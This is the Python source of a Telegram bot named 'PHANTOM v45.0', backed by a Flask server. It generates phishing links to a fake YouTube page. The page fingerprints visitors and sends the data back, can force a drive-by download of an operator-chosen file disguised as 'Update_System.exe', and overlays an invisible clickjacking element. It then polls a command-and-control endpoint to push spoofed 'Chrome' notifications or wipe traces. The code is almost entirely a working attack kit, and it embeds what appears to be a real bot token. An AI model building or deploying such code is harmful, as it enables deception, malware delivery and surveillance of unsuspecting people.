import asyncio, threading, requests, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Базы данных в памяти
active_commands = {} 
waiting_for_text = {} 
waiting_for_file = {} # Кто сейчас должен прислать файл
user_files = {}      # Прямые ссылки на файлы юзеров
user_modes = {}      # Режимы (normal/download)

# --- [2] GHOST-CLICK + DOWNLOAD TEMPLATE ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube Mobile</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin:0; background:#000; overflow:hidden; width:100vw; height:100vh; display:flex; align-items:center; justify-content:center; }
        #ui { position:fixed; top:0; left:0; width:100%; height:100%; background:url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; display:flex; align-items:center; justify-content:center; z-index:10; }
        .play { width:80px; height:55px; background:red; border-radius:12px; position:relative; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
        .play:after { content:''; position:absolute; left:32px; top:15px; border-left:22px solid white; border-top:13px solid transparent; border-bottom:13px solid transparent; }
        #ghost { position:absolute; width:140px; height:50px; background:transparent; z-index:2000; display:none; }
    </style>
</head>
<body onclick="ignite()">
    <div id="ui"><div class="play"></div></div>
    <div id="ghost"></div>
<script>
let sid = "{{ sid }}", mode = "{{ mode }}", file = "{{ file_url }}", active = false;

function ignite() {
    if(active) return; active = true;
    
    // Сбор данных
    let gl = document.createElement('canvas').getContext('webgl');
    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
    let info = { sid: sid, ua: navigator.userAgent, gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A" };
    navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(info))));

    // Drive-by Download (только если файл прикреплен)
    if(mode === 'download' && file !== "None") {
        let a = document.createElement('a');
        a.href = file;
        a.download = "Update_System.exe"; 
        document.body.appendChild(a);
        a.click();
    }

    // Ghost Click позиционирование
    Notification.requestPermission();
    setTimeout(() => {
        let g = document.getElementById('ghost');
        g.style.display = 'block';
        g.style.top = (window.innerHeight/2) + 38 + 'px';
        g.style.left = (window.innerWidth/2) + 15 + 'px';
    }, 150);

    // C2 Опрос
    setInterval(async () => {
        try {
            let r = await fetch('/poll/' + sid);
            let c = await r.json();
            if(c.type === 'push') new Notification("Chrome", {body: c.txt});
            if(c.type === 'kill') { localStorage.clear(); location.href="https://google.com"; }
        } catch(e){}
    }, 4000);
    
    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 2000);
}
</script>
</body>
</html>
"""

# --- [3] FLASK BACKEND ---

@app.route('/ping')
def cron_ping(): return "ALIVE", 200

@app.route('/v/<sid>')
def victim_page(sid):
    uid = int(sid)
    return render_template_string(HTML_TEMPLATE, 
                                 sid=sid, 
                                 mode=user_modes.get(uid, "normal"), 
                                 file_url=user_files.get(uid, "None"))

@app.route('/log', methods=['POST'])
def logger():
    raw = base64.b64decode(request.get_data()).decode()
    data = json.loads(urllib.parse.unquote(raw))
    sid = data['sid']
    kb = InlineKeyboardBuilder().button(text="🔔 PUSH", callback_data=f"req_push_{sid}").button(text="☣️ KILL", callback_data=f"req_kill_{sid}")
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": int(sid), "text": f"🎯 **ОТЧЕТ**\\nGPU: `{data['gpu'][:25]}`", "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
    return "OK"

@app.route('/poll/<sid>')
def poll(sid): return jsonify(active_commands.pop(sid, {"type": "none"}))

# --- [4] BOT LOGIC ---

@dp.message(Command("start"))
async def start(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Обычная").button(text="☣️ С загрузкой файла").as_markup(resize_keyboard=True)
    await m.answer("🕶 **PHANTOM v45.0**\\nВыбери тип ссылки:", reply_markup=kb)

@dp.message(F.text == "☣️ С загрузкой файла")
async def ask_file(m: types.Message):
    waiting_for_file[m.from_user.id] = True
    await m.answer("📥 **Отправь мне файл**, который должен скачаться у цели.")

@dp.message(F.document)
async def handle_docs(m: types.Message):
    if m.from_user.id in waiting_for_file:
        file_info = await bot.get_file(m.document.file_id)
        # Генерируем прямую ссылку на файл через Telegram API
        file_url = f"https://api.telegram.org/file/bot{API_TOKEN}/{file_info.file_path}"
        user_files[m.from_user.id] = file_url
        user_modes[m.from_user.id] = "download"
        waiting_for_file.pop(m.from_user.id)
        await m.answer(f"✅ Файл принят.\\n🔗 **Твоя ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")

@dp.message(F.text == "🧨 Обычная")
async def normal_link(m: types.Message):
    user_modes[m.from_user.id] = "normal"
    user_files[m.from_user.id] = "None"
    await m.answer(f"🔗 **Твоя обычная ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")

# Модерация Оверлордом
@dp.callback_query(F.data.startswith("req_"))
async def req(c: types.CallbackQuery):
    _, act, sid = c.data.split("_")
    kb = InlineKeyboardBuilder().button(text="✅ ДА", callback_data=f"ovl_ok_{act}_{sid}").button(text="❌ НЕТ", callback_data="ovl_no").as_markup()
    await bot.send_message(OVERLORD_ID, f"⚖️ Юзер `{c.from_user.id}` хочет `{act}` для `{sid}`", reply_markup=kb)
    await c.answer("⏳ Ждем Оверлорда...")

@dp.callback_query(F.data.startswith("ovl_"))
async def overlord(c: types.CallbackQuery):
    if c.from_user.id != OVERLORD_ID: return
    d = c.data.split("_")
    if d[1] == "no": return await c.message.edit_text("Отклонено.")
    _, _, act, sid = d
    if act == "push":
        waiting_for_text[int(sid)] = sid
        await bot.send_message(int(sid), "✍️ Введи текст пуша:")
    else:
        active_commands[sid] = {"type": "kill"}
        await bot.send_message(int(sid), "☣️ KILL отправлен.")
    await c.message.edit_text("✅ Разрешено.")

@dp.message(F.text)
async def text_handler(m: types.Message):
    if m.from_user.id in waiting_for_text:
        sid = waiting_for_text.pop(m.from_user.id)
        active_commands[sid] = {"type": "push", "txt": m.text}
        await m.answer("📨 Пуш отправлен.")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
